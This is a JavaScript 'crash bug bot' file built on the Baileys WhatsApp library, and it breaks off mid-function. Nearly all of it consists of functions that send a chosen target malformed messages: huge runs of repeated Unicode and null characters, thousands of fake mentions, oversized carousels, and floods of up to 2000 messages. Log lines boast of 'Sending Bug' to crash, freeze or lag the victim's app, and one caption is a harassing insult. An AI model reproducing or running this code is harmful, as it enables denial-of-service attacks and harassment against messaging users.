const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");
const crypto = require('crypto')
let prim;

const GetsuVoidsTravasX = JSON.stringify({
              status: true,
              criador: "Primis",
              resultado: {
                type: "md",
                ws: {
                  _events: {
                    "CB:ib,,dirty": ["Array"]
                  },
                  _eventsCount: 80000,
                  _maxListeners: 0,
                  url: "wss://web.whatsapp.com/ws/chat",
                  config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    sockCectTimeoutMs: 2000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 6000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnsockCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                  }
                }
              }  
            });

async function ForceCloseOverButton(prim, target) {
              prim.relayMessage(target, {
                      interactiveMessage: {
                          header: {
                              title: ".🩸⃟༑P҉r҉i҉m҉e҉ ✞ K҉i҉l҉l҉e҉r҉ ✞ C҉r҉a҉s҉h҉e҉r҉ ✞ B҉u҉g҉ B҉o҉t҉ཀ🦠",
                              hasMediaAttachment: false
                          },
                          body: {
                              text: "ꦽ".repeat(200) + "ꦾ".repeat(100000) + "\u0003".repeat(9000),
                          },
                          nativeFlowMessage: {
                              messageParamsJson: "",
                              buttons: [
                   { name: "single_select", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "payment_method", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "call_permission_request", buttonParamsJson: GetsuVoidsTravasX + "\u0003", voice_call: "call_galaxy" },
                   { name: "form_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "wa_payment_learn_more", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "wa_payment_transaction_details", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "wa_payment_fbpin_reset", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "catalog_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "payment_info", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "review_order", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "send_location", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "payments_care_csat", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "view_product", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "payment_settings", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "address_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "automated_greeting_message_view_catalog", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "open_webview", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "message_with_link_status", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "payment_status", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "galaxy_costum", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "extensions_message_v2", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "landline_call", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "mpm", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "cta_copy", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "cta_url", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "review_and_pay", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "galaxy_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                   { name: "cta_call", buttonParamsJson: GetsuVoidsTravasX + "\u0003" }
                  ]
                 }
                }
              },
            { participant: { jid: target } }
           );
           await new Promise(resolve => setTimeout(resolve, 500));
          }

async function OverParams(prim, target) {
              let msg = await generateWAMessageFromContent(
                target,
                {
                  viewOnceMessage: {
                    message: {
                      interactiveMessage: {
                        header: {
                          title: "",
                          hasMediaAttachment: false,
                        },
                        body: {
                          text: ".🩸⃟༑⌁⃰P҉r҉i҉m҉e҉ ✞ K҉i҉l҉l҉e҉r҉ ✞ C҉r҉a҉s҉h҉e҉r҉ ✞ B҉u҉g҉ B҉o҉t҉ཀ🦠" + "ꦽ".repeat(200) + "ꦾ".repeat(100000) + "\u0003".repeat(9000),
                        },
                        nativeFlowMessage: {
                          messageParamsJson: "",
                          buttons: [
                            {
                              name: "single_select",
                              buttonParamsJson: GetsuVoidsTravasX + "\u0000",
                            },
                            {
                              name: "call_permission_request",
                              buttonParamsJson: GetsuVoidsTravasX + ".🩸⃟༑⌁⃰P҉r҉i҉m҉e҉ ✞ K҉i҉l҉l҉e҉r҉ ✞ C҉r҉a҉s҉h҉e҉r҉ ✞ B҉u҉g҉ B҉o҉t҉ཀ🦠",
                            },
                          ],
                        },
                      },
                    },
                  },
                },
                {}
              );

              await prim.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target },
              });
              await new Promise(resolve => setTimeout(resolve, 500));
              }
              
async function InteractiveUI(prim, target) {
              prim.relayMessage(target, {
                      viewOnceMessage: {
                          message: {
                              interactiveMessage: {
                                  header: {
                                      hasMediaAttachment: false,
                                      title: "./િ፷⛧ＰＲＩΜΞ⛧ kîᄂᄂér ⛧ƘΞИŦ⛧ ፮▾ ༑̴⟆" 
                                      + "ោ៝".repeat(50000) + "ཹ".repeat(50000),
                                  },
                                  body: {
                                      text: "",
                                  },
                                  nativeFlowMessage: {
                                      name: "single_select",
                                      messageParamsJson: "",
                                  },
                                  payment: {
                                      name: "galaxy_message",
                                      messageParamsJson: '{"icon":"DOCUMENT","flow_cta":"\\u0000","flow_message_version":"3"}',
                                  },
                              },
                          },
                      },
                  },
                  {}
              );
              await new Promise(resolve => setTimeout(resolve, 500));
              }
              
async function invico1(prim, target) {
              const msg = {
                  newsletterAdminInviteMessage: {
                    newsletterJid: "120363321780343299@newsletter",
                    newsletterName: "./િ፷P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉̽፮▾ ༑̴⟆" 
                    + "ោ៝".repeat(25000) + "ཹ".repeat(50000),
                    caption: "./િ፷𝑫̶𝒔̈́͟𝑷𝒓̶ᐁ𝑰𝒎̽͢𝒊𝒔𝑺̽፮▾ ༑̴⟆" 
                    + "ោ៝".repeat(25000) + "ཹ".repeat(50000),
                    inviteExpiration: "999999999",
                    contextInfo: {
                      remoteJid: "-t.me/Handsome_primis_killer_kent",
                      stanzaId: "666",
                      participant: target,
                      quotedMessage: {
                        paymentInviteMessage: {
                          serviceType: 3,
                          expiryTimestamp: Date.now() + 1814400000
                        }
                      }
                    }
                  }
                };

              await prim.relayMessage(target, msg, {
                participant: { jid: target },
                messageId: null
              });
              await new Promise(resolve => setTimeout(resolve, 500));
              }

async function invico2(prim, target) {
              const msg = {
                  groupInviteMessage: {
                    groupJid: "120363370626418572@g.us",
                    inviteCode: "974197419741",
                    inviteExpiration: "97419741",
                    groupName: "./િ፷P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉፮▾ ༑̴⟆" 
                    + "ោ៝".repeat(25000) + "ཹ".repeat(50000),
                    caption: "./િ፷P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉̽፮▾ ༑̴⟆" 
                    + "ោ៝".repeat(25000) + "ཹ".repeat(50000),
                    jpegThumbnail: null,
                    contextInfo: {
                      remoteJid: "-t.me/Handsome_primis_killer_kent",
                      stanzaId: "666",
                      participant: target,
                      quotedMessage: {
                        paymentInviteMessage: {
                          serviceType: 3,
                          expiryTimestamp: Date.now() + 1814400000
                        }
                      }
                    }
                  }
                };
              await prim.relayMessage(target, msg, {
              participant: { jid: target }, 
              messageId: null
              })
              await new Promise(resolve => setTimeout(resolve, 500));
              }
              
async function FlowCrash(prim, target) {
              let select = [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
              ];
              
              for(let i = 0; i < 20; i++) {
                select.push(
                  {
                    name: "cta_call",
                    buttonParamsJson: JSON.stringify({
                      display_text: "ꦽ".repeat(5000),
                    }),
                  },
                  {
                    name: "cta_copy",
                    buttonParamsJson: JSON.stringify({
                      display_text: "ꦽ".repeat(5000),
                    }),
                  },
                  {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                      display_text: "ꦽ".repeat(5000),
                    }),
                  },
                );
              }

              const msg = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      header: {
                        title: "",
                        locationMessage: {},
                        hasMediaAttachment: true
                      },
                      body: {
                        text: " ./િ፷P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉፮▾ ༑̴⟆ " + "\0".repeat(900000)
                      },
                      nativeFlowMessage: {
                             name: "review_and_pay",
                              buttonParamsJson: "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"X - ex3s\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"X - ex3s\",\"native_payment_methods\":[],\"share_payment_status\":true}"
                      },
                      carouselMessage: {},
                      buttons: select,
                      contextInfo: {
                        remoteJid: "30748291653858@lid",
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["0@s.whatsapp.net"],
                        urlTrackingMap: {
                          urlTrackingMapElements: [
                            {
                              originalUrl: "https://nekopoi.care",
                              unconsentedUsersUrl: "https://nekopoi.care", 
                              consentedUsersUrl: "https://nekopoi.care",
                              cardIndex: 1
                            },
                            {
                              originalUrl: "https://nekopoi.care",
                              unconsentedUsersUrl: "https://nekopoi.care",
                              consentedUsersUrl: "https://nekopoi.care",
                              cardIndex: 2
                            }
                          ]
                        },
                        quotedMessage: {
                          paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                          }
                        }
                      }
                    }
                  }
                }
              }, {});

              await prim.relayMessage(target, msg.message, { messageId: msg.key.id });
              await new Promise(resolve => setTimeout(resolve, 500));
              }
              
async function BlankUiNew(prim, target) {
              try {
              const msg = {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      header: {
                        documentMessage: {
                          title: "P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉ was Here" + "ી".repeat(50000),
                          fileName: "info.pptx",
                          pageCount: 999999,
                          fileLength: 999999999,
                        },
                        hasMediaAttachment: true,
                      },
                      body: {
                        text:
                          "./I Crashing is my thing 🦠" +
                          "ꦾ".repeat(80000) +
                          "ោ៝".repeat(70000),
                      },
                      footer: {
                        text: "Primis ¿?",
                      },
                      nativeFlowMessage: {
                        buttons: [],
                        messageParamsJson: "{}",
                      },
                    },
                  },
                },
              };

              await prim.relayMessage(target, msg, {
                messageId: null,
              });
              } catch (error) {
              console.error(chalk.red("[BlankUi] Failed:"), error);
              }
              await new Promise(resolve => setTimeout(resolve, 500));
              }
              
async function gsglx(prim, target) {
  for (let i = 0; i < 25; i++) {
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\u0000".repeat(1000),
              format: "DEFAULT"
            }, 
            nativeFlowResponseMessage: {
              name: "galaxy_message", 
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    }, {});

    await prim.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
      participant: { jid: target }
    });
  }
  console.log(chalk.green("─────「 ⏤ Gs-Galaxy Ex3cute 」─────"));
}

async function InVisibleChart(prim, target) {
              const message = await generateWAMessageFromContent(target, {
                              viewOnceMessage: {
                                  message: {
                                      interactiveResponseMessage: {
                                          body: {
                                          text: ' િ፷P҉r҉i҉m҉e҉ ✞ K҉i҉l҉l҉e҉r҉ ✞ C҉r҉a҉s҉h҉e҉r҉ ✞ B҉u҉g҉ B҉o҉t҉ཀ ̽፮▾ ༑̴⟆ ',
                                          format: 'DEFAULT'
                                          },
                                          nativeFlowResponseMessage: {
                                              name: 'call_permission_request',
                                              paramsJson: '\u0000'.repeat(1045000),
                                              version: 3
                                              }
                                          }
                                      }
                                  }
                              }, { userJid: target, quoted: null });

              await prim.relayMessage('status@broadcast', message.message, {
                              messageId: message.key.id,
                              statusJidList: [target],
                              additionalNodes: [
                                  {
                                      tag: 'meta',
                                      attrs: {},
                                      content: [
                                          {
                                              tag: 'mentioned_users',
                                              attrs: {},
                                              content: [
                                                  { tag: 'to', attrs: { jid: target }, content: [] }
                                                  ]
                                              }
                                          ]
                                      }
                                  ]
                              });

              console.log(chalk.yellow('─────「 ⏤ InVisible Android Executed 」─────'));
              await new Promise(resolve => setTimeout(resolve, 500));
              }

    async function sjlglx(target) {
              await prim.relayMessage("status@broadcast", {
                  viewOnceMessage: {
                  message: {
                      interactiveResponseMessage: {
                      body: { 
                          text: "\n",
                          format: "DEFAULT" 
                      },
                      nativeFlowResponseMessage: {
                          name: "galaxy_message",
                          paramsJson: `{ "${'\u0000'.repeat(1000000)}" }`,
                          version: 3
                      },
                      contextInfo: {
                          isForwarded: true,
                          forwardingScore: 9999,
                          forwardedNewsletterMessageInfo: {
                          newsletterName: "ោ៝".repeat(100),
                          newsletterJid: "120363309802495518@newsletter",
                          serverMessageId: 1
                          }
                      }
                      }
                  }
                  }
              },
              {
                  statusJidList: [target],
                  additionalNodes: [
                  {
                      tag: "meta",
                      attrs: {},
                      content: [
                      {
                          tag: "mentioned_users",
                          attrs: {},
                          content: [{ tag: "to", attrs: { jid: target }, content: [] }]
                      }
                      ]
                  }
                  ]
              });

              console.log(chalk.green("─────「 ⏤ SjL-Galaxy Ex3cute 」─────"));
              await sleep(1000);
              }
              async function InVisibleF(prim, target) {
              const media = await prepareWAMessageMedia(
                  { video: { url: "https://i.postimg.cc/59sJ2MQp/IMG-20251217-WA0158.jpg" } },
                  { upload: prim.waUploadToServer }
              );
              
              const embeddedMusic = {
                  musicContentMediaId: "589608164114571",
                  songId: "870166291800508",
                  author: "P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉" + "ោ៝".repeat(10000),
                  title: ">! P҉r҉i҉m҉e҉ ✞ K҉i҉l҉l҉e҉r҉ ✞ C҉r҉a҉s҉h҉e҉r҉ ✞ B҉u҉g҉ B҉o҉t҉ !<",
                  artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
                  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                  artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                  artistAttribution: "https://www.instagram.com/handsome_kent_rishi_khan?igsh=MTkwMWpueW56cnB5ZQ==",
                  countryBlocklist: true,
                  isExplicit: true,
                  artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
              };

              const msg = {
                  key: {
                      id: prim.generateMessageTag(),
                      remoteJid: target,
                      fromMe: true
                  },
                  message: {
                      viewOnceMessage: {
                          message: {
                              videoMessage: {
                                  ...media.videoMessage,
                                  caption: "િ፷P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉ཀ̽፮▾ ༑̴⟆" + "ោ៝".repeat(1000),
                                  contextInfo: {
                                      forwardingScore: 9999,
                                      isForwarded: true,
                                      mentionedJid: [
                                      "969696969696@s.whatsapp.net", 
                                      ...Array.from({ length: 2000 }, () => 
                                      "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net" ),
                                      ],
                                      stanzaId: prim.generateMessageTag(),
                                      participant: "0@s.whatsapp.net",
                                      remoteJid: target,
                                      isSampled: true,
                                      forwardedNewsletterMessageInfo: {
                                          newsletterJid: "969@newsletter",
                                          serverMessageId: 1,
                                          newsletterName: "UPDATE"
                                      },
                                      businessMessageForwardInfo: {
                                          businessOwnerJid: "0@s.whatsapp.net"
                                      },
                                      smbClientCampaignId: "smb_client_campaign_id_example",
                                      smbServerCampaignId: "smb_server_campaign_id_example",
                                      dataSharingContext: { 
                                          showMmDisclosure: true 
                                      },
                                      forwardedAiBotMessageInfo: {
                                          botName: "Meta AI",
                                          botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                          creatorName: "Bot Ai"
                                      }
                                  },
                                  annotations: [
                                      {
                                          embeddedContent: { embeddedMusic },
                                          embeddedAction: true
                                      }
                                  ]
                              }
                          }
                      }
                  }
              };

              await prim.relayMessage("status@broadcast", msg.message, {
                  messageId: msg.key.id,
                  statusJidList: [target],
                  additionalNodes: [
                      {
                          tag: "meta",
                          attrs: {},
                          content: [
                              {
                                  tag: "mentioned_users",
                                  attrs: {},
                                  content: [
                                      {
                                          tag: "to",
                                          attrs: { jid: target },
                                          content: []
                                      }
                                  ]
                              }
                          ]
                      }
                  ]
              });

              console.log(chalk.green("# Success Sending Bug By P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉🦠🐉"));
              await new Promise(resolve => setTimeout(resolve, 500));
              }
// ------------------------------------------ [ InVisible Lag ] ------------------------------------------
async function InVisibleRespone(prim, target) {
              const delaymention = Array.from({ length: 2000 }, (_, r) => ({
                  title: "᭡꧈".repeat(95000),
                  rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
              }));

              const MSG = {
                  viewOnceMessage: {
                      message: {
                          listResponseMessage: {
                              title: "િ፷P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉፮▾፮▾ ༑̴⟆",
                              listType: 2,
                              buttonText: null,
                              sections: delaymention,
                              singleSelectReply: { selectedRowId: "🔴" },
                              contextInfo: {
                                  mentionedJid: Array.from({ length: 2000 }, () => 
                                      "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                  ),
                                  participant: target,
                                  remoteJid: "status@broadcast",
                                  forwardingScore: 9741,
                                  isForwarded: true,
                                  forwardedNewsletterMessageInfo: {
                                      newsletterJid: "333333333333@newsletter",
                                      serverMessageId: 1,
                                      newsletterName: "-"
                                  }
                              },
                              description: "🩸⃟༑⌁⃰P҉r҉i҉m҉e҉ ✞ K҉i҉l҉l҉e҉r҉ ✞ C҉r҉a҉s҉h҉e҉r҉ ✞ B҉u҉g҉ B҉o҉t҉ཀ🦠"
                          }
                      }
                  },
                  contextInfo: {
                      channelMessage: true,
                      statusAttributionType: 2
                  }
              };

              const msg = generateWAMessageFromContent(target, MSG, {});

              await prim.relayMessage("status@broadcast", msg.message, {
                  messageId: msg.key.id,
                  statusJidList: [target],
                  additionalNodes: [
                      {
                          tag: "meta",
                          attrs: {},
                          content: [
                              {
                                  tag: "mentioned_users",
                                  attrs: {},
                                  content: [
                                      {
                                          tag: "to",
                                          attrs: { jid: target },
                                          content: undefined
                                      }
                                  ]
                              }
                          ]
                      }
                  ]
              });
              await new Promise(resolve => setTimeout(resolve, 500));
              } 

async function blank(target) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "િ፷P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉፮▾ ༑̴⟆" + "ោ៝".repeat(10000),
      caption: "XxX" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
      inviteExpiration: "999999999",
    },
  };

  await prim.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
}

async function FrezeXblank(prim, jid) {
try {
  const videoPayload = await prepareWAMessageMedia({
    video: { url: "https://i.postimg.cc/59sJ2MQp/IMG-20251217-WA0158.jpg", gifPlayback: true }
  }, {
    upload: prim.waUploadToServer,
    mediaType: "video"
  })
  for (let i = 0; i < 100; i++) {
    const msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [jid],
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399013145023@newsletter",
            newsletterName: "✦",
            serverMessageId: 1
          }
        },
        header: {
          title: "",
          ...videoPayload,
          hasMediaAttachment: true
        },
        body: { text: "P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉" },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{"title":"${"ꦾ".repeat(10000)}","sections":[{"title":"Crash","rows":[]}]}`
            },
            {
              name: "address_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(10000),
                "screen_0_Dropdown_1":  "\u0000".repeat(10000),
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { userJid: jid })
    await prim.relayMessage(target, msg.message, { messageId: msg.key.id })
  }
} catch (err) {
      console.error(err);
 }
console.log(chalk.red(`Success Sent Bug To ${jid}`))
}

async function PhotoDelay(prim, target) {
let haxxn = 10;

for (let i = 0; i < haxxn; i++) {
let push = [];
let buttt = [];

for (let i = 0; i < 5; i++) {
buttt.push({
"name": "galaxy_message",
"buttonParamsJson": JSON.stringify({
"header": "null",
"body": "xxx",
"flow_action": "navigate",
"flow_action_payload": { screen: "FORM_SCREEN" },
"flow_cta": "Grattler",
"flow_id": "1169834181134583",
"flow_message_version": "3",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
})
});
}

for (let i = 0; i < 1000; i++) {
push.push({
"body": {
 "text": " " 
},
"footer": {
"text": ""
},
"header": {
"title": ' ',
"hasMediaAttachment": true,
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
"fileLength": "591",
"height": 0,
"width": 0,
"mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
"fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
"directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1721344123",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
"scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
"scanLengths": [
247,
201,
73,
63
],
"midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
}
},
"nativeFlowMessage": {
"buttons": []
}
});
}

const msg = generateWAMessageFromContent(target, {
"viewOnceMessage": {
"message": {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
"interactiveMessage": {
"body": {
"text": "\u0000\u0000\u0000\u0000"
},
"footer": {
"text": " "
},
"header": {
"hasMediaAttachment": false
},
"carouselMessage": {
"cards": [
...push
]
}
}
}
}
}, {});

await prim.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
participant: { jid: target }
});
}
}

async function bokep(target) {
  try {
    let mediaBomb = await generateWAMessageFromContent(target, {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4&oh=01_Q5Aa2wGoHq3M24ZbF0TDnEhYSG2jwm21vorcv-ZQ4_fKDWEhyQ&oe=692EDC9C&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        caption: "Primis ¿?" + "ꦾ".repeat(5000),
        fileSha256: "st3b6ca+9gVb+qgoTd66spG6OV63M/b4/DEM2vcjWDc=",
        fileLength: "9999999999",
        height: 916,
        width: 720,
        mediaKey: "n5z/W8ANmTT0KmZKPyk13uTpm3eRB4czy0p/orz6LOw=",
        fileEncSha256: "CxcswDicTjs/UHDH1V5DWZh25jk1l0zMLrcTEJyuYMM=",
        directPath: "/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4&oh=01_Q5Aa2wGoHq3M24ZbF0TDnEhYSG2jwm21vorcv-ZQ4_fKDWEhyQ&oe=692EDC9C&_nc_sid=e6ed6c&_nc_hot=1762092861",
        mediaKeyTimestamp: "1762085432",
        jpegThumbnail: Buffer.from(
          "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAABAECAwUGAQADAQEAAAAAAAAAAAAAAAAAAQMCBP/aAAwDAQACEAMQAAAA6iK052qv1Jy+R0dVGejPNFJuyypOjdJZNqpvYJpEFIN600nvWlx6lZlU0ialOdtnK86sYN5hktvdnIHRYvcDTEgy2QAsAl//xAAkEAACAgICAgICAwAAAAAAAAABAgADETEEIHIiEBM0YQUyUf/aAAgBAQABPwBuZSh3L+e79VR0dvZjmEfqey9zjfyVlXT9iUciu9coYqgljAF3APKFVA/rAldg7XEsrrBIAlNrce9COgYoKMUh2QJWMACW0ee4qGsAQ1eRIyRLVxdTnWZy8B8jcrBcxHxA4Ilrd/oRyMhhLz9lqINkwkuCTsysYhUKhMUnEwuyRLcf6JR+bXEEB8GhYOpEVfXBn1gDIWW6PrOH+YrHUURDoERqEI6GIQ1Z71PsXG5aylTPAhIPhWyBLATDxwOzFrTHaiXrFx8AwHuMQYTiXEET/8QAGhEAAgMBAQAAAAAAAAAAAAAAAAECICEQEf/aAAgBAgEBPwBts8FgtHj7GkaOv//EABsRAAMAAwEBAAAAAAAAAAAAAAABEQIQICEx/9oACAEDAQE/AIQeOrUhDSMvr0jycUnP/9k=",
          "base64"
        ),
        contextInfo: {
          mentionedJid: Array.from({ length: 500 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
          isForwarded: true,
          forwardingScore: 999,
          externalAdReply: {
            title: "you're gay",
            body: "ꦾ".repeat(8000),
            thumbnailUrl: "https://i.postimg.cc/59sJ2MQp/IMG-20251217-WA0158.jpg",
            sourceUrl: "https://t.me/Handsome_primis_killer_kent",
            mediaType: 1,
            showAdAttribution: true,
            renderLargerThumbnail: true
          }
        }
      }
    }, { userJid: target });

    await prim.relayMessage(target, mediaBomb.message, {
      messageId: mediaBomb.key.id,
    });

    for (let i = 0; i < 2000; i++) {
      let forwardMsg = await generateWAMessageFromContent(target, {
        extendedTextMessage: {
          text: `[Primis ¿? ${i}] ` + "𑜦𑜠".repeat(3000),
          contextInfo: {
            stanzaId: "KMTL_" + Date.now() + "_" + i,
            participant: target,
            quotedMessage: {
              conversation: "ꦾ".repeat(2000),
              imageMessage: mediaBomb.message.imageMessage
            },
            forwardingScore: 999,
            isForwarded: true,
            forwardCounter: i + 1
          }
        }
      }, { userJid: target });

      await prim.relayMessage(target, forwardMsg.message, {
        messageId: forwardMsg.key.id,
      });

      await new Promise(r => setTimeout(r, 50));
    }

    console.log(" DONE");

  } catch (crt) {
    console.error(" ERROR:", crt);
  }
}


//==============Functions Ios================


async function LocX(prim, target) {
 for (let i = 0; i < 100; i++) {
  const LocaX = {
    viewOnceMessage: {
      message: {
